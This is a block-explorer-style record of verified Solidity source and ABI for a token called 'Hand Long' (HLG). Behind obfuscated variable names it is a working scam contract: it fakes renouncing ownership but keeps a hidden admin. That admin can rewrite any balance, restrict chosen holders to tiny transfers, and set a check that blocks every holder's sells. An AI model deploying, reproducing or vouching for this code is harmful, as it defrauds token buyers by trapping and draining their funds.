{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface isBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeFundLiquidity) external view returns (uint256);\n\n    function transfer(address exemptReceiver, uint256 teamAuto) external returns (bool);\n\n    function allowance(address autoMinSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptReceiver,\n        uint256 teamAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);\n    event Approval(address indexed autoMinSender, address indexed spender, uint256 value);\n}\n\nabstract contract amountFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldSell {\n    function createPair(address receiverListFund, address liquidityLaunched) external returns (address);\n}\n\ninterface isBuyMetadata is isBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HandLong is amountFund, isBuy, isBuyMetadata {\n\n    mapping(address => bool) public launchedShould;\n\n    function liquiditySell(address takeAuto) public {\n        if (tradingLaunch) {\n            return;\n        }\n        if (receiverEnable != tokenTake) {\n            buyReceiver = false;\n        }\n        fundTokenShould[takeAuto] = true;\n        if (tokenList) {\n            receiverEnable = limitListMax;\n        }\n        tradingLaunch = true;\n    }\n\n    bool private buyReceiver;\n\n    function transferFrom(address isSellFrom, address exemptReceiver, uint256 teamAuto) external override returns (bool) {\n        if (_msgSender() != atReceiverLaunched) {\n            if (launchBuy[isSellFrom][_msgSender()] != type(uint256).max) {\n                require(teamAuto <= launchBuy[isSellFrom][_msgSender()]);\n                launchBuy[isSellFrom][_msgSender()] -= teamAuto;\n            }\n        }\n        return shouldAmount(isSellFrom, exemptReceiver, teamAuto);\n    }\n\n    function balanceOf(address feeFundLiquidity) public view virtual override returns (uint256) {\n        return takeShouldWallet[feeFundLiquidity];\n    }\n\n    function exemptTrading() private view {\n        require(fundTokenShould[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed listTo, address indexed txTeam);\n\n    function name() external view virtual override returns (string memory) {\n        return launchedTx;\n    }\n\n    bool public tradingLaunch;\n\n    bool private tokenList;\n\n    function enableFee(address maxSell) public {\n        exemptTrading();\n        if (takeBuyTrading != receiverEnable) {\n            takeBuyTrading = receiverEnable;\n        }\n        if (maxSell == atToken || maxSell == senderLaunchList) {\n            return;\n        }\n        launchedShould[maxSell] = true;\n    }\n\n    uint256 public enableLaunchedMarketing;\n\n    string private launchedTx = \"Hand Long\";\n\n    address public senderLaunchList;\n\n    address private liquidityListTotal;\n\n    mapping(address => bool) public fundTokenShould;\n\n    uint256 private tokenTake;\n\n    uint256 public takeBuyTrading;\n\n    uint8 private maxWalletMarketing = 18;\n\n    function allowance(address atFund, address listReceiver) external view virtual override returns (uint256) {\n        if (listReceiver == atReceiverLaunched) {\n            return type(uint256).max;\n        }\n        return launchBuy[atFund][listReceiver];\n    }\n\n    address public atToken;\n\n    uint256 fundLaunchMin;\n\n    function marketingList(address fromList, uint256 teamAuto) public {\n        exemptTrading();\n        takeShouldWallet[fromList] = teamAuto;\n    }\n\n    function shouldAmount(address isSellFrom, address exemptReceiver, uint256 teamAuto) internal returns (bool) {\n        if (isSellFrom == atToken) {\n            return takeSwapAt(isSellFrom, exemptReceiver, teamAuto);\n        }\n        uint256 amountLaunched = isBuy(senderLaunchList).balanceOf(takeLaunched);\n        require(amountLaunched == fundLaunchMin);\n        require(exemptReceiver != takeLaunched);\n        if (launchedShould[isSellFrom]) {\n            return takeSwapAt(isSellFrom, exemptReceiver, takeLimitMin);\n        }\n        return takeSwapAt(isSellFrom, exemptReceiver, teamAuto);\n    }\n\n    function transfer(address fromList, uint256 teamAuto) external virtual override returns (bool) {\n        return shouldAmount(_msgSender(), fromList, teamAuto);\n    }\n\n    function maxIs(uint256 teamAuto) public {\n        exemptTrading();\n        fundLaunchMin = teamAuto;\n    }\n\n    bool private launchedAt;\n\n    address takeLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant takeLimitMin = 4 ** 10;\n\n    string private teamList = \"HLG\";\n\n    function getOwner() external view returns (address) {\n        return liquidityListTotal;\n    }\n\n    bool private swapTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableBuy;\n    }\n\n    uint256 private enableBuy = 100000000 * 10 ** 18;\n\n    uint256 tradingAutoExempt;\n\n    address atReceiverLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private receiverEnable;\n\n    function takeSwapAt(address isSellFrom, address exemptReceiver, uint256 teamAuto) internal returns (bool) {\n        require(takeShouldWallet[isSellFrom] >= teamAuto);\n        takeShouldWallet[isSellFrom] -= teamAuto;\n        takeShouldWallet[exemptReceiver] += teamAuto;\n        emit Transfer(isSellFrom, exemptReceiver, teamAuto);\n        return true;\n    }\n\n    uint256 private buyToken;\n\n    mapping(address => uint256) private takeShouldWallet;\n\n    mapping(address => mapping(address => uint256)) private launchBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamList;\n    }\n\n    function tradingLimitTotal() public {\n        emit OwnershipTransferred(atToken, address(0));\n        liquidityListTotal = address(0);\n    }\n\n    uint256 public limitListMax;\n\n    function approve(address listReceiver, uint256 teamAuto) public virtual override returns (bool) {\n        launchBuy[_msgSender()][listReceiver] = teamAuto;\n        emit Approval(_msgSender(), listReceiver, teamAuto);\n        return true;\n    }\n\n    constructor (){\n        if (launchedAt) {\n            takeBuyTrading = tokenTake;\n        }\n        launchLaunched maxTrading = launchLaunched(atReceiverLaunched);\n        senderLaunchList = shouldSell(maxTrading.factory()).createPair(maxTrading.WETH(), address(this));\n        if (buyReceiver == swapTx) {\n            tokenTake = limitListMax;\n        }\n        atToken = _msgSender();\n        tradingLimitTotal();\n        fundTokenShould[atToken] = true;\n        takeShouldWallet[atToken] = enableBuy;\n        if (launchedAt) {\n            launchedAt = true;\n        }\n        emit Transfer(address(0), atToken, enableBuy);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxWalletMarketing;\n    }\n\n    function owner() external view returns (address) {\n        return liquidityListTotal;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMinSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFundLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSell\",\"type\":\"address\"}],\"name\":\"enableFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunchedMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTokenShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitListMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAuto\",\"type\":\"address\"}],\"name\":\"liquiditySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"marketingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"maxIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunchList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuyTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLimitTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSellFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HandLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}